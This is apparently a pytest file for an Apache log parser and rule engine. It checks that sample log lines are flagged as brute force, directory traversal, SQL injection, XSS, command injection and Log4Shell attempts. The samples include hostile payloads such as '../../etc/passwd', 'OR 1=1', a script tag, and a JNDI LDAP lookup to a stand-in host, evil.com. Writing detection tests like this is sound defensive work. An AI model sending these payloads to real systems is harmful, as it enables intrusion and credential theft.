from pathlib import Path
from parser.utils import parse_line
from parser.rules import RuleEngine
import pytest


def test_parse_line_apache():
    line = '127.0.0.1 - - [10/Oct/2000:13:55:36 -0700] "GET /index.html HTTP/1.1" 200 2326 "-" "Mozilla/5.0"'
    ev = parse_line(line, "apache")
    assert ev is not None
    assert ev.ip == "127.0.0.1"
    assert ev.method == "GET"
    assert ev.url == "/index.html"
    assert ev.status == 200


def test_rules_detection(tmp_path: Path):
    logs = [
        # 0: Brute force (should trigger alert)
        '1.1.1.1 - - [10/Oct/2000:13:55:00 -0700] "GET /login HTTP/1.1" 401 0 "-" "curl/8.0"',
        # 1: Brute force (second attempt)
        '1.1.1.1 - - [10/Oct/2000:13:55:10 -0700] "GET /login HTTP/1.1" 401 0 "-" "curl/8.0"',
        # 2: Directory Traversal (plain)
        '2.2.2.2 - - [10/Oct/2000:13:55:20 -0700] "GET /../../etc/passwd HTTP/1.1" 404 0 "-" "Mozilla/5.0"',
        # 3: SQL Injection (classic)
        '3.3.3.3 - - [10/Oct/2000:13:55:30 -0700] "GET /p.php?id=1\' OR 1=1 -- HTTP/1.1" 200 0 "-" "sqlmap/1.7"',
        # 4: XSS (Cross-Site Scripting)
        '4.4.4.4 - - [10/Oct/2000:13:56:00 -0700] "GET /search?q=<script>alert(1)</script> HTTP/1.1" 200 0 "-" "Mozilla/5.0"',
        # 5: Command Injection
        '5.5.5.5 - - [10/Oct/2000:13:57:00 -0700] "GET /exec?cmd=cat+/etc/passwd HTTP/1.1" 500 0 "-" "Mozilla/5.0"',
        # 6: Log4Shell Attempt
        '6.6.6.6 - - [10/Oct/2000:13:58:00 -0700] "GET / HTTP/1.1" 200 1024 "-" "${jndi:ldap://evil.com/a}"',
    ]
    evs = [parse_line(l, "apache") for l in logs]
    engine = RuleEngine(
        brute_force_threshold=2, brute_force_window_sec=60, burst_5xx_threshold=999
    )
    alerts = engine.run([e for e in evs if e])
    types = sorted(set(a.type for a in alerts))

    # --- Verify that all expected alert types are present ---
    assert "Brute Force" in types
    assert "Directory Traversal" in types
    assert "SQL Injection" in types
    assert "Cross-Site Scripting (XSS)" in types
    assert "Command Injection" in types
    assert "Log4Shell Attempt" in types


def test_no_false_positives():
    logs = [
        '10.1.1.1 - - [10/Oct/2000:14:00:00 -0700] "GET /index.html HTTP/1.1" 200 3456 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
        '10.1.1.2 - - [10/Oct/2000:14:00:05 -0700] "POST /api/data HTTP/1.1" 201 123 "-" "MyCustomApp/1.0"',
        '10.1.1.3 - - [10/Oct/2000:14:00:10 -0700] "GET /images/pic.jpg HTTP/1.1" 200 15678 "-" "Mozilla/5.0"',
    ]
    evs = [parse_line(l, "apache") for l in logs]
    engine = RuleEngine()
    alerts = engine.run([e for e in evs if e])

    # --- Ensure no alerts are generated for benign traffic ---
    assert len(alerts) == 0
